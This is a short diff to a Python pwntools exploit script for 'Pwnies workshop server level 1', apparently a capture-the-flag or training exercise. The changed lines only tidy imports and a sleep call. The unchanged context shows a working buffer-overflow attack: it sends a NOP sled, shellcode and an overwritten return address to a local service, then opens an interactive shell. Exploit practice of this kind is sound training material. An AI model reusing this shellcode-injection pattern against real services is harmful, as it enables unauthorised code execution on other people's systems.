@@ -2,11 +2,8 @@
 
 # Pwnies workshop server level 1
 
-import sys, socket
-from pwn import *
+from pwn.classic import *
 from pwn.i386 import nops, scramble
-context('i386', 'linux', 'ipv4')
-import time
 
 sock = remote('localhost', 1337, timeout = 120)
 sock.recvuntil('Your output to my input? Do your best!\n')
@@ -25,7 +22,7 @@ sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')
 #
 # In both these cases, it is nececary to sleep, to make sure that
 # the tag will be the first 4 bytes of a seperate recv.
-time.sleep(0.1) 
+sleep(0.1) 
 
 sock.send(p32(tag).ljust(127))
 sock.interactive()
